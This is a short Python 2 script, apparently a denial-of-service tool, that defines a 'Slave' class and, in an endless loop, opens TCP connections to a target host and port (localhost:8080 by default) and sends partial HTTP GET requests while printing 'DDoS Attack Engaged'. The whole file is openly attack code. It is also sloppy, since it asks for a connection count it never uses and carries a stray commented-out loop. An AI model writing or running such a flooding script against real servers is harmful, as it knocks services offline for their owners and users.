#!/usr/bin/python
import time, socket, os, sys, string

class Slave():
    def __init__(self, host, port, sock=None):
        print("DDoS mode loaded")
        self.host = host
        self.port = port
        self.message='asdf'
        conn=input("How many connections do you want to make: ")
        ip = socket.gethostbyname(self.host)
        self.num_connections = 0

    def dos(self):
        try:
            self.ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.ddos.connect((self.host, self.port))
            self.ddos.send("GET /%s HTTP/1.1\r\n" % self.message)
        except socket.error, msg:
            self.num_connections = self.num_connections+1
            print("|[Connection Failed] | %d", self.num_connections )
        print ("|[DDoS Attack Engaged] |")
        #ddos.close()

if __name__ == '__main__':
  slaveNode = Slave('localhost', 8080)

  while(1):
#for i in xrange(conn):
    slaveNode.dos()
